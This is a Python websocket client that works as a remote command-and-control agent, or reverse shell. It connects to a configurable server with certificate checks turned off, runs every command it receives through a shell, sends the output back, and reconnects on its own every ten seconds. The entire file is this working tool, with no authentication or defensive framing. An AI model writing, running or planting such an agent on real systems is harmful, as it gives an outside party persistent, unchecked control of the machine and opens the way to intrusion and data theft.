import asyncio
import websockets
import subprocess
import ssl
import json
import os
from sys import exit

# --- Basic Configuration ---
# HOST: Server IP address to connect to
# PORT: Server port to connect to
HOST = '127.0.0.1' 
PORT = 8765 

# --- Controlled End Logic ---
class Execute_command:
    """Command execution class for executing system commands locally"""
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            # If output is too long, truncate it to avoid transmitting large data
            if len(stdout) > 900000:
                stdout = stdout[:900000] + "..."
            return {
                "execute_command": command,
                "returncode": result.returncode,
                "stdout": stdout,
                "stderr": result.stderr
            }
        except Exception as e:
            return {
                "execute_command": command,
                "error": str(e)
            }

    def change_directory(self, directory):
        try:
            os.chdir(directory)
            return "[bold green]Successfully changed working directory[/bold green]"
        except Exception as e:
            return "[bold red]Failed to change working directory[/bold red]: " + str(e)

# --- Client Logic ---
async def client_loop():
    """
    Client main loop
    Responsible for establishing connection with server and processing received commands
    """
    # Configure SSL context, disable certificate verification
    # Do not use this configuration in untrusted environments
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            # Attempt to connect to server
            async with websockets.connect(f'wss://{HOST}:{PORT}', ssl=ssl_context, ping_interval=10) as websocket:
                execute_command = Execute_command()
                # Continuously receive and process commands sent by server
                async for command in websocket:
                    match command:
                        case "exit": exit()
                        case command if command.startswith("command:"): 
                            # Execute command and send result back to server
                            await websocket.send(json.dumps(execute_command.execute_command(command[8:]), ensure_ascii=False))
                        case command if command.startswith("cd:"):
                            # Change working directory
                            await websocket.send(execute_command.change_directory(command[3:]))

        except Exception as e:
            # Wait 10 seconds before retrying when an exception occurs
            await asyncio.sleep(10)
        except KeyboardInterrupt:
            exit()

# --- Main Function ---
if __name__ == "__main__":
    """Program entry point"""
    try:
        asyncio.run(client_loop())
    except KeyboardInterrupt:
        exit()
